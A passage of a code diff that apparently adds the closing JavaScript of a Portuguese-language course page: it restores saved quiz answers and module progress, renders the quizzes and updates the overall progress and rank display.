+    salvarProgresso();
+  }
+}
+
+// ============================================
+// INICIALIZACAO: carrega progresso salvo e so entao renderiza os quizzes
+// ============================================
+const dadosSalvos = carregarProgressoSalvo();
+Object.assign(quizAnswers, dadosSalvos.quiz);
+
+document.querySelectorAll('.quiz-container').forEach(container => {
+  const mod = container.getAttribute('data-quiz-mod');
+  renderQuiz(mod);
+});
+
+Object.keys(dadosSalvos.progresso).forEach(mod => {
+  if (dadosSalvos.progresso[mod]) {
+    setModuloConcluido(mod, true, true);
+  }
+});
+
+atualizarProgressoGeral();
+// Evita disparar a animacao de rank e o banner de celebracao so por carregar a pagina
+atualizarNivelDeAcesso(Object.values(progressoModulos).filter(Boolean).length / TOTAL_MODULOS, true);
+</script>
+</body>
+</html>
